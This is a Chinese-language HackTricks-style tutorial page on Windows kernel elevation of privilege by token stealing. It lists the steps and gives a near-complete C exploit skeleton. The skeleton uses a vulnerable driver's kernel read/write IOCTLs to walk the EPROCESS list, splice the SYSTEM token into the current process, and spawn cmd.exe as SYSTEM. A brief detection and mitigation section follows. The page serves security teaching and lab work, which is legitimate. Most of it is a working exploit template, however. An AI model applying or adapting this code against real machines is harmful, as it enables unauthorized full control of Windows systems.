# Windows kernel EoP：使用 arbitrary kernel R/W 窃取 Token

{{#include ../../banners/hacktricks-training.md}}

## 概述

如果存在漏洞的驱动程序暴露了可为攻击者提供任意 kernel read 和/或 write 原语的 IOCTL，通常可以通过窃取 SYSTEM access token 来提升至 NT AUTHORITY\SYSTEM。该技术会将 SYSTEM 进程的 EPROCESS 中的 Token 指针复制到当前进程的 EPROCESS 中。<sup>[[2]](#references)</sup>

其原理如下：
- 每个进程都有一个 EPROCESS 结构，其中包含（以及其他字段）一个 Token（实际上是指向 token object 的 EX_FAST_REF）。
- SYSTEM 进程（PID 4）持有一个启用了所有 privileges 的 token。
- 将当前进程 EPROCESS.Token 替换为 SYSTEM token 指针后，当前进程会立即以 SYSTEM 身份运行。<sup>[[1]](#references)</sup>

> EPROCESS 中的 offsets 会因 Windows 版本而异。请动态确定它们（使用 symbols），或使用特定版本的 constants。另外请记住，EPROCESS.Token 是一个 EX_FAST_REF（低 3 位是 reference count flags）。

## 高层步骤

1) 定位 ntoskrnl.exe base 并解析 PsInitialSystemProcess 的地址。
- 在 user mode 下，使用 NtQuerySystemInformation(SystemModuleInformation) 或 EnumDeviceDrivers 获取已加载驱动的 bases。
- 将 PsInitialSystemProcess 的 offset（通过 symbols/reversing 获得）加到 kernel base 上，以获取其地址。
2) 读取 PsInitialSystemProcess 指向的 pointer → 这是指向 SYSTEM 的 EPROCESS 的 kernel pointer。
3) 从 SYSTEM EPROCESS 中读取 UniqueProcessId 和 ActiveProcessLinks offsets，通过 EPROCESS 结构的双向链表（ActiveProcessLinks.Flink/Blink）进行遍历，直到找到 UniqueProcessId 等于 GetCurrentProcessId() 的 EPROCESS。保留以下两个值：
- EPROCESS_SYSTEM（SYSTEM 的 EPROCESS）
- EPROCESS_SELF（当前进程的 EPROCESS）
4) 读取 SYSTEM token value：Token_SYS = *(EPROCESS_SYSTEM + TokenOffset)。
- 清除低 3 位：Token_SYS_masked = Token_SYS & ~0xF（根据 build 的不同，通常为 ~0xF 或 ~0x7；在 x64 上使用低 3 位，即 0xFFFFFFFFFFFFFFF8 mask）。
5) 选项 A（常见）：保留当前 token 的低 3 位，并将其拼接到 SYSTEM 的 pointer 上，以保持嵌入的 ref count 一致。
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) 使用 kernel write primitive 将 Token_NEW 写回 (EPROCESS_SELF + TokenOffset)。
7) 当前进程现在已经是 SYSTEM。可以选择启动新的 cmd.exe 或 powershell.exe 进行确认。<sup>[[1]](#references)</sup>

## Pseudocode

下面是一个 skeleton，仅使用来自存在漏洞驱动的两个 IOCTL：一个用于 8-byte kernel read，另一个用于 8-byte kernel write。请替换为驱动程序的 interface。<sup>[[1]](#references)</sup>
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Notes:
- Offsets：使用 WinDbg 的 `dt nt!_EPROCESS` 配合目标的 PDB，或使用 runtime symbol loader，以获取正确的 offsets。不要盲目硬编码。
- Mask：在 x64 上，token 是一个 EX_FAST_REF；低 3 位是 reference count bits。保留 token 原有的低位，可以避免立即出现 refcount 不一致。
- Stability：优先提升当前进程的权限；如果提升的是短生命周期的 helper，可能会在其退出时失去 SYSTEM。<sup>[[1]](#references)</sup>

## Detection & mitigation
- 加载暴露强大 IOCTL 的 unsigned 或不受信任的 third-party drivers 是根本原因。
- Kernel Driver Blocklist (HVCI/CI)、DeviceGuard 和 Attack Surface Reduction rules 可以阻止 vulnerable drivers 加载。
- EDR 可以监控实现 arbitrary read/write 的可疑 IOCTL sequences，以及 token swaps。

## References

- [1] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [2] [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
